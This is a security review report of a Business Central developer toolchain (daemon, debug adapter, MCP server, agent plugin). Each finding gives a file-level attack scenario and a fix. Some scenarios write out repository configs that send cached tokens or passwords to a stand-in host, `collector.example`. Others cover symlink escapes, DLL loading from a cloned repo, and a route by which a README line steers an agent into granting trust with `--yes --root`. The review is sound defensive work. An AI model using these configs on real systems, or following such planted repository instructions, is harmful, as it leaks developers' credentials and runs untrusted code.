# Round 4 security review: the final campaign diff

Reviewer brief: the fourth and last security round. Read the whole campaign diff
(`git diff dev..campaign/2026-09-21`) with weight on what merged after the round 3 fixes on
2026-09-22, as an attacker who controls a repository the user clones and opens, a `.app` in its
`.alpackages`, or a process of another user on the same machine. Review only, no code changes.

Branch reviewed: `campaign/2026-09-21` at `fa4fcf8f`.

Earlier rounds, not repeated here: `r1-extension-ci-security.md`, `r2-security.md`,
`r3-security.md`. Their fixed findings were re-checked only where later code touched them.

## Coverage

- [x] project trust: the store, the digest, `al-explorer trust`, every consumer
- [x] analyzer DLL loading: `pack-native --validate`, `lint --analyzers`, `build --analyzers`
- [x] `.alpackages` symlink roots, binary paths (`dotnetPath`, alc path)
- [x] daemon path containment and the capability registry (`dispatch_table!`)
- [x] methods added since 2026-09-22: `freeIds`, `publish`, `packageDiff`, `obsolete --used`, `downloadSymbols`, incremental scan, file watcher
- [x] credentials: authorisation function, https rule, `AL_ALLOW_INSECURE_BC_HTTP`, token cache, OAuth
- [x] daemon handshake: HMAC key, peer uid, Windows named pipe
- [x] archive parsing: nupkg, `.app` readers, `package-diff` on arbitrary `.app` files
- [x] Claude Code plugin: hooks, scripts, context injection
- [x] MCP server: tool schemas, `instructions`
- [x] Zed extension download and checksum, release workflow provenance
- [x] pre-trust reach of a hostile repository or `.app`

## Findings

### [SECURITY] high: the Zed debug adapter sends the cached Business Central token to any server a repository's `.zed/debug.json` names

- where: `crates/al-lsp/src/bin/al-lsp.rs:347-359` (the `--dap` token provider returns
  `BC_ACCESS_TOKEN` or `al_symbols::oauth::acquire_token` for whatever tenant it is asked for),
  `crates/al-dap/src/dap/native_dap/session.rs:95` (`BcDebugConfig::from_dap_args(arguments)`,
  the arguments are the debug scenario Zed read from the worktree), `:145` (token acquired),
  `:177` (`danger_accept_invalid_certs(config.accept_invalid_certs)` from the same scenario),
  `:182` and `crates/al-dap/src/dap/bc_debug/rest.rs:113-126` (`Bearer` sent to
  `{server}:{port}/{instance}/dev/webendpoint`), `session.rs:211` (`publish_app` with the token),
  `session.rs:257` (`BcDebugSession::connect` with the token),
  `crates/al-dap/src/dap/bc_debug/session_config.rs:425-434` (`onprem_base` uses `server` as
  written, scheme included). `src/dap.rs:40-88` passes `config.config` through unchanged.
  `grep -rn authorize_cached_credential crates/al-dap` finds nothing.
- attack: a cloned repository ships `.zed/debug.json` with one scenario labelled
  `"Publish and debug (sandbox)"` whose body is
  `{"adapter":"al","request":"attach","environmentType":"OnPrem","server":"http://collector.example","serverInstance":"BC","authentication":"AAD","tenant":"organizations"}`.
  The developer opens the folder in Zed, picks the scenario from the debug panel (the panel shows
  the label), and starts it. `handle_launch_attach` validates the shape only
  (`validate_native` checks the authentication mode and the enum values), calls the token
  provider, which reads the OAuth cache or runs the device flow the developer expects to see,
  and `BcDebugSession::connect` sends `Authorization: Bearer <token>` to
  `http://collector.example:7049/BC/dev/DebuggerHub` in cleartext. With `"request":"launch"`
  the same token also goes to `/dev/webendpoint` and `/dev/apps`. The attacker holds a Business
  Central API token for every environment the developer can reach, for its lifetime.
  `acceptInvalidCerts: true` in the same file turns off TLS verification for an `https` collector.
  The daemon's `debug` method refuses exactly this configuration
  (`crates/al-lsp/src/server/daemon/debug_dispatch.rs:254-258` calls
  `authorize_cached_credential` with `TargetSource::Repository`), and
  `Docs/features/project-trust.md` lists "`launch.json` / `debug.json` on-premises `server`" as
  a value that takes effect only in a trusted project. The Zed debug adapter is the main consumer
  of `.zed/debug.json` and it skips the gate. `al.useOfficialDap` (`src/settings.rs:189-205`)
  hands the same scenario to Microsoft's host through `--dap-legacy`, also with no gate.
  [UNVERIFIED] whether Zed builds from v0.218.2 (worktree trust, cited in `src/settings.rs`)
  hide `.zed/debug.json` scenarios in an untrusted worktree the way they hide project settings.
  Either way the adapter should apply this project's own rule, as the daemon does.
- fix: in `handle_launch_attach`, before calling `acquire_token`, build
  `BcTarget::from_debug(&config.environment_type, config.server.as_deref(), config.port)` and
  call `al_project::trust::authorize_cached_credential(project_root, &target,
  CredentialKind::Bearer, TargetSource::Repository)`. Refuse the launch on `Err`, and replace
  `config.accept_invalid_certs` with the authorisation's `may_accept_invalid_certs`. Put the
  check in al-dap (or pass an authoriser closure in from `al-lsp.rs` beside `acquire_token`) so
  every DAP entry point shares it. Add a DAP-level test that an untrusted project with an
  on-premises `http://` server gets a failed launch response and no request reaches the mock.
- status: fixed 9961e25c. Both DAP entry points run `dap_mode::authorize_debug_scenario`
  (`authorize_cached_credential`, scenario judged as a repository file, `acceptInvalidCerts`
  only where granted) on launch and attach before any compile, token or request. Tests:
  `dap_refuses_a_launch_the_authoriser_refuses_before_any_token_or_request`,
  `dap_refuses_cached_token_for_an_untrusted_repository_server`,
  `the_legacy_proxy_answers_a_refused_launch_instead_of_forwarding_it`.

### [SECURITY] high: `tests.run` and the Run Test code lens send the user's environment credentials to the repository's launch server, with an `http://` default

- where: `crates/al-lsp/src/server/daemon/build_dispatch/tests_dispatch/mod.rs:772-790` (the
  launch file is read from the project and its first configuration is taken when the request
  names none), `:867` (`LiveBcMode::new(cfg)`, no authorisation call on the way),
  `crates/al-test/src/test_runner.rs:83-86` (`danger_accept_invalid_certs` from the launch file),
  `:240-246` (`BC_USERNAME`/`BC_PASSWORD` as Basic), `:255-269` (`BC_ACCESS_TOKEN` or `BC_TOKEN`
  as Bearer), `:339-351` (a `server` with no scheme becomes `http://`).
  The LSP path is the same without the daemon: `crates/al-lsp/src/server/commands.rs:709`
  (`TestRunnerClient::new(&config)` for the Run Test code lens).
  `tests.run`, `tests.run_batch` and `tests.run_auto` are declared `[]` in the dispatch table
  (`crates/al-lsp/src/server/daemon/mod.rs:1225-1230`), so they are not in the `Authorized` list.
- attack: a developer who publishes to on-premises servers exports `BC_USERNAME` and
  `BC_PASSWORD` (the publish docs tell them to), and the daemon, the MCP server and Zed's
  language server inherit them. A cloned repository ships `.vscode/launch.json` whose first
  configuration is `{"name":"Local","type":"al","request":"launch","environmentType":"OnPrem","server":"collector.example","serverInstance":"BC","authentication":"UserPassword"}`
  and one test codeunit that uses something the router sends to live Business Central (the
  daemon names the reason in `live_reason`). An agent asked to run the tests calls the MCP tool `al_runtests`, which takes no arguments and forwards to
  `tests.run_auto` (`crates/al-lsp/src/server/mcp/mod.rs:836-843`), or follows the plugin skill
  `bc-test-locally`, whose first command is `al-explorer --json test-run-all`, or the developer
  clicks Run Test above the procedure. `build_base_url` turns
  the bare host into `http://collector.example/BC`, and `apply_auth` sends
  `Authorization: Basic <user:password>` there in cleartext. With `"authentication":"AAD"` it
  sends `BC_ACCESS_TOKEN` instead.
  This is the case `publish` was put behind the authorisation function for:
  `crates/al-publish/src/lib.rs:355-359` authorises `CredentialKind::Environment` against
  `TargetSource::Repository`, and `Docs/features/project-trust.md` explains that the environment
  is the user's decision but "which server receives it is the repository's". The same document
  then lists `tests.run*` under "Where the caller brings its own credential", which is not true
  when the server comes from the repository's launch file.
- fix: in `dispatch_tests_run_batch`, once `selected` is known and before `LiveBcMode::new`,
  call `authorize_cached_credential(&project_root, &BcTarget::from_launch(&cfg),
  CredentialKind::Environment, TargetSource::Repository)`, refuse on `Err`, and set
  `cfg.accept_invalid_certs` from the result. Do the same in `run_test_background`. Default a
  scheme-less `server` to `https://` in `build_base_url`, as the authorisation function already
  does when it parses the same string (`trust.rs` `BcTarget::endpoint`), so the check and the
  request agree on the scheme. Declare the three methods `[authorized]` and move them in
  `project-trust.md` from "caller brings its own credential" to the authorised list.
- status: fixed 957d445c. `tests.run*` and the Run Test code lens call
  `authorize_live_test_target` (`authorize_cached_credential`, `Environment`, `Repository`)
  before any request, and the three methods are declared `[authorized]`. Test:
  `tests_run_refuses_the_launch_server_of_an_untrusted_repository`.

### [SECURITY] medium: the authorisation reads a bare host as `https`, the request builders send to it as `http`

- where: `crates/al-project/src/trust.rs:777-780` (`BcTarget::endpoint` retries a server that
  does not parse as a URL with `https://` prepended, so `bc.corp.example` is judged as
  `https`), `:851-861` (the cleartext refusal keys on that scheme),
  `crates/al-bc/src/launch.rs:283-301` (`server_with_scheme` prepends `http://` to the same
  bare host), used by `crates/al-bc/src/bc_client.rs:550` (`publish`) and
  `crates/al-bc/src/launch.rs:77` (`dev_packages_url`, symbol download from a BC server).
- attack: a repository's `.vscode/launch.json` names `"server": "bc.corp.example"` with
  `"authentication": "UserPassword"`. The developer runs `al-explorer trust --show`, reads
  `launch configuration server = bc.corp.example:7049`, and trusts it, since the host is theirs.
  `publish` then calls `authorize_cached_credential`, which parses the server as
  `https://bc.corp.example`, passes the "no cleartext unless loopback or
  `AL_ALLOW_INSECURE_BC_HTTP=1`" rule, and returns `Ok`. `BcClient::new` builds
  `http://bc.corp.example:7049/BC` and sends `BC_USERNAME:BC_PASSWORD` as Basic in cleartext.
  `downloadSymbols` from the server does the same through `dev_packages_url`. Anyone on the
  network path reads the password. The only sign is a `warn!` in the daemon log.
  The https rule exists to hold even for a trusted project: trust decides which server, the
  rule decides whether the credential crosses the wire readable. The check and the request
  disagree on the scheme, so for this one spelling the rule is not applied. An inline caller
  can use the same gap once the project is trusted: an inline `serverUrl` of `bc.corp.example`
  matches the launch entry, both judged `https`.
- fix: one normalisation for both sides. Have `BcTarget::endpoint` call
  `al_bc::launch::server_with_scheme` and parse its result, so a bare host is judged as the
  `http` the client will use and is refused unless it is loopback or the variable is set. Better,
  change `server_with_scheme` to prepend `https://` (Business Central on-premises dev endpoints
  serve TLS in any deployment that sends credentials), and keep the check calling it so the two
  cannot drift again. Test: a trusted project with a bare non-loopback host is refused by
  `publish` and by `downloadSymbols` without the variable.
- status: fixed e4fff85b. Decision: a scheme-less server is `https`. `server_with_scheme`
  prepends `https://` and `BcTarget::endpoint`, the test runner and the debug session all read
  the server through it, and a cleartext server is written `http://` with
  `AL_ALLOW_INSECURE_BC_HTTP=1` off loopback (recorded in `project-trust.md`). Tests:
  `a_bare_host_is_sent_as_https`, `a_bare_host_is_judged_as_the_https_url_the_request_uses`.

### [SECURITY] high: the four XLIFF methods take absolute paths with no containment, and `xlf.generate` writes through a repository symlink

- where: `crates/al-lsp/src/server/daemon/build_dispatch/xliff.rs:15-24` (`xlf.generate` accepts
  any absolute `project`), `crates/al-analysis/src/xliff/mod.rs:148-152` (`create_dir_all` and
  `std::fs::write` on `<project>/Translations/<app name>.g.xlf`, both follow symlinks),
  `xliff.rs:180-195` and `:198-205` (`xlf.refresh` takes any absolute `xlf` and `generated`),
  `:278` (`write_atomically` replaces `xlf` wherever it is), `:289-326` (`xlf.untranslated`
  reads any absolute path, and is not even passed the workspace), `:358-400` (`xlf.suggest`,
  same read). All four are declared `[]` in the dispatch table
  (`crates/al-lsp/src/server/daemon/mod.rs:1219-1222`), so the containment test
  (`daemon/tests.rs:338`) skips them.
- attack: two routes.
  1. Planted link, no unusual parameters. A cloned repository ships `Translations` as a
     symlink to a directory outside the project, or ships `Translations/<AppName>.g.xlf` as a
     dangling symlink to a path outside it, with `app.json` naming the app to match. An agent or
     the developer asks for the translation file to be generated (`al_call xlf.generate`, or
     the CLI verb). `build_xliff` writes the generated document through the link, outside the
     project, with content that includes caption and label text from the repository's AL
     source. This is the dangling-symlink write that round 2 closed in `containment.rs` and
     `write_no_follow`, reached through a writer that uses neither.
  2. Caller-named paths. `xlf.refresh` with `xlf` set to an existing UTF-8 file anywhere the
     user can write reads it, then atomically replaces it with an XLIFF document built from the
     file named by `generated`. A prompt-injected agent call destroys a file outside the
     project. `xlf.untranslated` and `xlf.suggest` read any path the caller names, and the
     size cap reads `metadata.len()`, which is 0 for a character device, so a device path
     makes `read_to_string` grow without bound in the daemon.
  The round 1 fix summary says every daemon path parameter goes through `containment.rs`.
  These four were missed, and the registry cannot show it because they declare no path use.
- fix: drop the `project` override from `xlf.generate` (the daemon serves one project), and
  resolve `xlf`, `generated` and the `Translations` output through
  `containment::resolve_within_project`. Write the generated file with
  `containment::write_no_follow` (or `create_new` on a temp file plus a rename after checking
  the target is not a link), and refuse a `Translations` directory that resolves outside the
  root. Open inputs with a read cap (`Read::take(MAX_XLF_FILE_BYTES + 1)`) and refuse
  anything that is not a regular file, rather than trusting `metadata.len()`. Extend the
  registry so a method that takes any path-valued parameter, not only `uri`/`file`, must
  declare it, and add these four to the containment test.
- status: fixed dc8c6603. The XLIFF methods resolve `xlf`/`generated` through
  `resolve_within_project` and read regular files capped on bytes read, `xlf.generate` takes
  only the loaded project and writes by rename into a `Translations` inside it, and the
  registry's new `[named]` capability puts them in a containment test. Tests:
  `every_named_path_dispatcher_refuses_a_path_outside_the_project`,
  `build_xliff_replaces_a_planted_link_instead_of_following_it`.

### [SECURITY] high: a user's own analyzer name resolves to a DLL the untrusted repository ships, on every compile path except `--validate`

- where: `crates/al-project/src/analyzers.rs:102-109` (a bare analyzer name is looked up under
  `<project>/.netpackages` and `<project>/packages` before `$NUGET_PACKAGES`, `~/.nuget` and
  the editor extension folders), `:91-96` (a relative `assemblyProbingPaths` entry, even from
  user settings, is joined to the project root), `crates/al-project/src/toolchain.rs:265`
  (`AnalyzerPaths::custom` is always empty, so `crates/al-compile/src/lib.rs:395-419` always
  falls through to `discover_custom_analyzer`). Callers with no guard:
  `crates/al-lsp/src/server/daemon/build_dispatch/build/compile.rs:386-399` (daemon `compile`
  with the alc backend), `crates/al-lsp/src/server/commands.rs:300-310` (LSP build command),
  `crates/al-lsp/src/bin/al-lsp.rs:435-442` (DAP launch compile),
  `crates/al-publish/src/lib.rs:312-320` (publish), and
  `crates/al-lsp/src/server/diagnostics.rs:586-590` with
  `crates/al-semantic/bridge/Bridge.cs:744` (`Assembly.LoadFrom` inside the al-lsp process
  when semantic analysis is on). Only `crates/al-explorer/src/cli/commands/build.rs:384-437`
  (`project_local_analyzers`) refuses this for an untrusted project.
- attack: the trust gate removes analyzer entries the repository wrote. It keeps entries the
  user wrote, which is right, but the user writes a name and the repository still chooses the
  file. A developer has `"al.codeAnalyzers": ["${CodeCop}", "BusinessCentral.LinterCop"]` in
  `~/.config/al-lsp/settings.json` or in Zed user settings, and the real DLL sits in the NuGet
  cache. A cloned repository ships `packages/any/BusinessCentral.LinterCop.dll` and sets
  `"al.useOfficialCompiler": true` (not privileged). Any build of that clone, through
  `al_build`, `al_call compile`, `al-explorer build`, the Zed build command, a debug launch or
  `publish`, passes `/analyzer:<clone>/packages/any/BusinessCentral.LinterCop.dll` to alc, and
  the analyzer's type initialisers run as the user. With `al.enableCodeAnalysis` and
  `al.backgroundCodeAnalysis` on (also not privileged), the semantic bridge resolves the same
  name while computing diagnostics for an opened file and loads the assembly into the language
  server itself, with no build at all. The project is untrusted throughout and no advisory is
  shown, because nothing the gate looks at was dropped.
  Round 4's session review found this for `pack-native --validate --analyzers` and the fix was
  applied to that one command.
- fix: move the rule into `discover_custom_analyzer` so every caller gets it. Give it the trust
  decision (or a `search_project: bool`), and when the project is not trusted skip
  `.netpackages`, `packages` and relative probing paths, and refuse a relative path entry.
  Alternatively search the user's locations first and the project last, which keeps the
  project from shadowing an installed analyzer but still lets a clone satisfy a name the user
  has not installed, so the trust check is the better fix. Then delete
  `project_local_analyzers` in favour of the shared rule. Tests: an untrusted project with
  `packages/x/Foo.dll` and a user-level `Foo` resolves to the NuGet copy or to an error, from
  `al_compile::build` and from `resolve_semantic_analyzer_entries`.
- status: fixed 2d889e93. `discover_custom_analyzer` decides trust itself and searches
  `.netpackages`, `packages` and relative probing paths, or accepts a relative analyzer path,
  only for a trusted project, and `project_local_analyzers` is gone. Tests:
  `an_untrusted_project_cannot_supply_a_user_named_analyzer`,
  `named_custom_analyzer_in_the_project_needs_trust`,
  `semantic_analyzer_resolution_preserves_builtins_and_needs_trust_for_project_copies`.

### [SECURITY] medium: the trust digest covers the path of a repository-resident analyzer or `dotnet`, not the file, so a later commit swaps the code under an existing record

- where: `crates/al-project/src/trust.rs:1069-1085` (`digest_of` hashes `source`, `key` and the
  value string), `:600-610` (`al.codeAnalyzers` recorded as the joined entry text),
  `:930-944` (`dotnetPath` and `binary.path` recorded as the path text),
  `Docs/features/project-trust.md` ("Change one of those values in the repository and the
  digest stops matching").
- attack: a team repository keeps its own analyzer in the tree:
  `"al.codeAnalyzers": ["${CodeCop}", "./tools/TeamCop.dll"]`. A developer reads
  `al-explorer trust --show`, sees a path inside the project, and trusts it. Later a commit
  (a compromised contributor account, or a pull request merged without reviewing a binary)
  replaces `tools/TeamCop.dll`. After `git pull` the settings text is unchanged, the digest
  matches, the state stays `trusted`, and the next build loads the new assembly into alc. The
  same holds for `al.dotnetPath` naming a program inside the repository and for an
  `assemblyProbingPaths` directory inside it. The record promises to cover "exactly what was
  printed", and what was printed was a file name. The daemon's per-request fingerprint does not
  help either, since it stats the settings files and not the DLL.
- fix: for each privileged path value that resolves inside the project root, fold the SHA-256
  of the file into the rendered value (and, for a directory, of every `.dll` below it that
  discovery could pick), so a changed binary makes the record `stale`. Print the hash in
  `trust --show` so the reviewer sees it is part of the record. Paths outside the project are
  the user's machine and can stay path-only.
- status: open

### [SECURITY] medium: a failed handshake proof is handled as a version mismatch, so it can be overridden and the replacement path continues past it

- where: `crates/al-protocol/src/client/mod.rs:471-477` (any `daemon_identity` error, including
  "the handshake proof did not match", is accepted when `AL_ALLOW_MISMATCHED_DAEMON` is set),
  `:500-509` (after replacing the daemon, a second failure is logged as "continuing with it"
  and the client is returned), `:460-462` (no expected identity means no challenge at all),
  `:583-585` (`handshake_secret()` returning `None` means the proof is not checked),
  `:1179-1200` (Windows `connect_stream`: no owner or peer check, recorded as open).
- attack: on Unix the kernel peer uid check in `connect_stream` is the control and the proof is
  a second layer. On Windows the proof is the only thing that tells the client whether the
  process on `\\.\pipe\al-lsp-<scope>-<project>` is this user's daemon, since pipe names are
  global and the owner check is not written. Three paths let a squatting process of another
  local user through without knowing the key:
  1. The squatter answers the first handshake without a proof. The client treats that as a
     stale build, sends `shutdown`, and waits for the endpoint to close. The squatter closes its
     pipe instance, then creates the name again before or beside the daemon the client just
     spawned. `spawn` connects to whichever instance answers, the second handshake fails, and
     `connect_checked` returns that client anyway. The next request goes to the squatter. The
     round 3 reproduction showed what such a request can carry: `snapshot` params with
     `BC_USERNAME` and `BC_PASSWORD`.
  2. A developer who set `AL_ALLOW_MISMATCHED_DAEMON=1` while iterating on the toolchain has
     turned off authentication too, because the override does not distinguish "other build"
     from "could not prove it holds the key".
  3. A client that cannot locate its `al-lsp` binary on a dirty build (`expected_identity`
     returns `None`), or cannot open the runtime directory (`handshake_secret` returns `None`),
     skips the challenge silently.
  [UNVERIFIED] on Windows: the pipe race in path 1 was reasoned from the code, not run. Paths 2
  and 3 are plain control flow and hold on every platform, where on Unix they are backed by the
  peer uid check.
- fix: separate authentication from build identity. A proof that is missing where a nonce and a
  key exist, or that does not match, is a refusal with its own error, checked before the
  identity comparison, not overridable by `AL_ALLOW_MISMATCHED_DAEMON`, and never followed by
  "continuing with it". Send nothing but `handshake` to an endpoint until the proof passes,
  including the `shutdown` in the replace path. Treat `handshake_secret() == None` as a refusal
  on Windows, where the proof is the only control. The Windows owner check
  (`GetNamedPipeServerProcessId` plus a SID comparison) stays the real fix.
- status: open

### [SECURITY] low: symbol download writes into `.alpackages` wherever it points, although containment stopped trusting a symlinked `.alpackages`

- where: `crates/al-lsp/src/server/daemon/build_dispatch/symbols_auth.rs:405-436` (`dest` is
  `project.packages_dir` as discovered), `crates/al-project/src/project.rs:353` (the default is
  `<root>/.alpackages`, not resolved), `crates/al-symbols/src/bc_server.rs:417-433` and the
  NuGet writer (`create_dir_all(dest)`, temp file and rename inside `dest`),
  `crates/al-lsp/src/server/daemon/containment.rs:300-352` (`roots_the_project_vouches_for`
  drops a package root that resolves outside the project unless it is trusted).
- attack: a cloned repository commits `.alpackages` as a symlink to a directory outside the
  project, and an `app.json` whose dependencies name publishers and apps that map to chosen
  file names (sanitised to `[A-Za-z0-9._-]`). `al_downloadsymbols`, or `downloadSymbols` from
  NuGet, which needs no trust, creates the target directory if needed and renames downloaded
  packages into it, replacing any file of the same name there. The content is a real package
  from the feed and the names end in `.app`, so this is a write of limited shape outside the
  project rather than code execution. It is the same symlinked root that round 2 took out of
  the containment boundary, and the same shape the trust gate refuses when it is spelled
  `"al.packageCachePath": "./cache"` with `cache` a symlink (`trust.rs`
  `stays_inside_project`). The reader side has the matching gap: packages in a symlinked
  `.alpackages` are indexed and served to agents without trust.
- fix: resolve `packages_dir` when the project is discovered and treat a default `.alpackages`
  that resolves outside the root exactly like an untrusted `packageCachePath`: fall back to a
  real directory inside the project, or refuse the download with the advisory. One predicate
  for both, taken from `stays_inside_project`.
- status: open

### [SECURITY] low: the per-binary digests the extension checks leave out the semantic bridge that al-lsp loads in process

- where: `.github/workflows/release.yml:156-168` (the archive carries `bridge/AlBridge.dll` and
  every other `*.dll` from the bridge output, and the digest list is written for `al-lsp` and
  `al-explorer` only, under a comment saying they "cover the bytes that actually get
  executed"), the Windows leg below it, `src/lib.rs:487-496` (the extension verifies those two
  members), `crates/al-semantic/src/host.rs:359-367` (al-lsp loads `<exe dir>/bridge/AlBridge.dll`
  through the .NET host into its own process).
- attack: not an attacker on the network, since the download is TLS and the list travels with
  the release. The gap is in what the check claims. A truncated or substituted bridge assembly
  inside an otherwise good archive passes verification, is made reachable beside the verified
  `al-lsp`, and runs in the language server's process on the first semantic diagnostic. The
  same holds for a tampered archive on a mirror or cache that serves the archive but not
  `binary-checksums.txt`. The release documentation and the workflow comment describe the
  verified set as everything executed.
- fix: hash every file in the staged directory (`find "$STAGE" -type f`) into
  `<archive>.binaries.sha256`, and have `verify_extracted_binaries` walk the extracted
  `bridge/` directory against the same list, refusing a file the list does not name. Until
  then, correct the comment to say which files are covered.
- status: open

### [SECURITY] low: `newProject` contains `dir` but then writes through symlinked subdirectories below it

- where: `crates/al-lsp/src/server/daemon/build_dispatch/codegen.rs:145` (only `dir` itself goes
  through containment), `crates/al-project/src/scaffold.rs:241-247` and `:630-637`
  (`create_dir_all(parent)` and `atomic_write` for `.vscode/launch.json`,
  `.zed/debug.json`, `.vscode/settings.json`, `src/...` under `dir`), `:348-361`
  (`refuse_existing_destinations` uses `Path::exists`, which follows links and is false for a
  dangling one), `:370-395` (`File::create` on a predictable `<file>.<pid>.tmp`, then `rename`).
- attack: a repository ships `tools/newapp/.vscode` as a symlink to a directory outside the
  project. An agent asked to scaffold an app in `tools/newapp` calls `newProject` with that
  `dir`. Containment accepts `dir`, the existence check looks through the link at the outside
  directory, and the scaffold creates `launch.json` (and any other planned file whose parent is
  a link) there. The names are fixed and the content is the scaffold template, so the effect is
  new files of a known shape outside the project, not a chosen write. It is the pattern the
  round 2 fix closed for single-file writers, still open in a multi-file writer.
- fix: resolve every planned destination through `resolve_path_within_roots` (which refuses a
  link anywhere in the not-yet-existing tail), check existence with `symlink_metadata`, and
  create the temp file with `create_new(true)` so a planted temp name fails instead of being
  followed.
- status: open

### [DOCS] low: `project-trust.md` describes `snapshot` and `profiling` as ungated, and the code gates them

- where: `Docs/features/project-trust.md:179-181` ("take `serverUrl`, `username`, `password`
  and their own `acceptInvalidCerts`, which is honoured because the caller chose both"),
  against `crates/al-lsp/src/server/daemon/build_dispatch/build/bc_server_params.rs:85-121`
  (`authorize_bc_server` requires an inline `serverUrl` to match a launch configuration of a
  trusted project and refuses `acceptInvalidCerts` unless that configuration sets it), called
  from `snapshot_profiling.rs:39` and `:199`.
- attack: none against the code. The risk is the next change: the trust document is the
  specification the registry test and reviewers read, it states the round 3 fix the wrong way
  round, and a maintainer who "restores documented behaviour" reopens the round 3 finding. The
  same section files `tests.run*` under "caller brings its own credential", which is the error
  behind the `tests.run` finding above. A smaller mismatch sits in the same function:
  `BcTarget::on_prem_url` leaves the port to `BcTarget::endpoint`, which uses 7049 when the URL
  has none, while the snapshot client connects to the URL as written (443 for `https://host/BC`),
  so the authorisation and the connection can name different ports on the approved host.
- fix: rewrite the section to list `snapshot` and `profiling` beside the authorised methods,
  with `acceptInvalidCerts` taken from the launch configuration, and move `tests.run*` as the
  `tests.run` finding says. In `on_prem_url`, take the port from the URL, defaulting by scheme,
  so the check compares the port the client will use.
- status: open

### [SECURITY] low: the native build follows symlinks out of the project and packages what it finds

- where: `crates/al-emit/src/project.rs:570-611` (`collect_al_files` descends with
  `Path::is_dir`, which follows a directory link, and accepts any entry whose name ends in
  `.al`, link or not), `:429` (`std::fs::read(f)` follows a file link). Compare
  `crates/al-source/src/file_index/mod.rs:1143-1145` (the workspace scan skips every symlink)
  and `:1075-1105` (`is_scanned_path`, the watcher's rule, refuses symlinked directories).
- attack: a cloned repository ships `src/shared` as a symlink to a sibling directory the
  developer is likely to have, for example another extension checked out next to it, or a
  file link `src/Setup.Codeunit.al` to a known path. The index and every query ignore the
  link, so nothing an agent or the developer reads shows it. `al_build`, `al-explorer build`,
  a debug launch or `publish` with the native backend (the default) compiles the linked
  sources into the `.app` it emits, with their source text included, and `publish` uploads that
  package to the environment in the repository's launch file. For a cloud sandbox that target
  needs no trust. The package leaves the machine carrying source the developer never meant to
  ship. A link to a non-AL file fails the build instead, with a diagnostic that names the file.
- fix: use the scan's rule in the emitter: skip symlinked entries (`DirEntry::file_type`, which
  does not follow), or share `al_source::file_index::collect_al_files` so the build compiles
  exactly the files the index shows.
- status: open

### [SECURITY] medium: `al-explorer trust --yes --root <project>` lets any non-interactive caller grant trust, and the refusal an agent receives tells it to use that

- where: `crates/al-explorer/src/cli/commands/trust.rs:119-145` (`--yes` with a matching
  `--root` returns without looking at the terminal), `:147-155` (the refusal for a call with no
  terminal ends "pass --yes together with --root <project>"), `crates/al-explorer/src/cli/args.rs:830`
  and `:842-847` (the help text advertises the same line as a scripted install),
  `Docs/features/project-trust.md` ("A scripted install whose settings you have read passes
  `--yes` together with `--root <project>`").
- attack: round 3 closed "anything running as the user grants trust in one non-interactive
  call" by reading the answer from the terminal device. `--yes --root` reopens that call for
  every caller that names the project, and an agent always knows the project path. A cloned
  repository carries a comment or a README line saying the build needs the project trusted. An
  agent with a shell tool runs `al-explorer trust`, gets the refusal, and the refusal names the
  flags that make the same call succeed. The next call records trust for the repository's
  analyzer paths, `compilationOptions`, feeds and launch servers, and the following build runs
  the repository's analyzer. The design goal in `project-trust.md`, "An agent must not run
  it", is enforced only by the agent choosing not to.
- fix: give the non-interactive path something an agent does not have in its context. The
  digest will not do, because `trust --show --json` prints it. A one-time code written only to
  the terminal device (`/dev/tty`, `CONOUT$`) and required by `--yes` would, since a caller
  with no terminal never sees it. Or drop `--yes` and have scripted installs write the record
  through a separate, documented step the user performs once. Either way, remove the flag from the
  refusal message: a refusal addressed to a caller that has no terminal is, by construction,
  addressed to a script or an agent.
- status: open

### [SECURITY] low: a revoke reaches the daemon on its next request but not a running language server

- where: `crates/al-lsp/src/server/daemon/mod.rs:774-805` (`refresh_trust` runs per request and
  re-evaluates when `inputs_fingerprint` moves), against `crates/al-lsp/src/server/lsp/mod.rs:875`
  and `:1496` (the LSP gates only in `initialize` and `didChangeConfiguration`).
  `Docs/features/project-trust.md` says "A revoke takes effect on the next request".
- attack: a developer notices a trusted project's analyzer list changed upstream and runs
  `al-explorer trust --revoke`. The daemon and the MCP server drop the privileged values on the
  next request. The Zed language server keeps the configuration it gated at startup, so its
  build command, its debug-launch compile and semantic analysis keep loading the analyzers and
  using the feeds the user just withdrew, until Zed restarts the server or the user edits Zed
  settings. The round 3 fix covered the two long-lived processes it looked at and not the third.
- fix: run the same fingerprint check in the LSP before each compile-shaped command and before
  semantic analysis resolves analyzers (the stat calls are cheap), or watch the trust store
  and re-gate on change. Say in `project-trust.md` which processes the revoke reaches.
- status: open

## Checked and sound

Each was read end to end and I could not break it with the inputs tried.

- **The dispatcher registry and containment for `uri`/`file` methods.** `dispatch_table!`
  (`crates/al-lsp/src/server/daemon/mod.rs:1081`) builds `DISPATCHERS` and the match from one
  list, and `daemon/tests.rs:338` drives every `PathUse::Read`/`Write` method with a path
  outside the project and asserts `PATH_NOT_AUTHORIZED` and that the file did not enter the
  document store. `the_authorized_dispatchers_are_the_ones_the_trust_doc_names` pins the
  credential set. The gap is a path-valued parameter the registry does not model (`xlf`,
  `generated`, `project`, `dir`'s children), which the XLIFF, `newProject` and native-build
  findings above cover, not the `uri`/`file` path this test guards.
- **`resolve_path_within_roots` and `write_no_follow`** (`daemon/containment.rs:56-152`,
  `:176-260`). Tried `..` above the root, an absolute outside path, a symlink at the leaf, a
  symlink in the not-yet-existing tail, a UNC path in either separator, and a trailing
  separator. Each is refused, and the write opens with `O_NOFOLLOW` on Unix. Every dispatcher
  that takes `uri`/`file` reaches it.
- **`snapshot` and `profiling` credential gate** (`bc_server_params.rs:85-121`,
  `snapshot_profiling.rs:39`, `:199`). An inline `serverUrl` must match a launch configuration
  of a trusted project, and `acceptInvalidCerts` is refused unless that configuration sets it.
  The round 3 fix holds. The port-normalisation nit is noted under the docs finding, not a
  crossing on its own.
- **The Unix endpoint peer check** (`crates/al-protocol/src/endpoint.rs`). `check_before_connect`
  refuses a symlinked or non-socket endpoint and walks the directory owners, and `check_peer`
  reads `SO_PEERCRED`/`getpeereid`, filled by the kernel, before any byte is sent
  (`client/mod.rs:1172-1176`). A planted socket of another uid is refused. The proof layered on
  top of it can fail open (finding above), but on Unix the uid check stands under it.
- **`package_filename` sanitising for downloaded packages** (`bc_server.rs:563-590`). `/`, `\`,
  `:`, `..` and an empty component all map to `_`, and `stream_package_to_file` opens the temp
  with `create_new`, so a hostile `app.json` publisher or name cannot escape `dest` or capture
  a planted link. `dest` itself is the separate `.alpackages` finding.
- **`.app` and nupkg readers** (`crates/al-symbols/src/app_reader.rs`, `nuget.rs`). `packageDiff`
  reads two `.app` files through `read_app_file`, which caps the file at 200 MiB, the entry
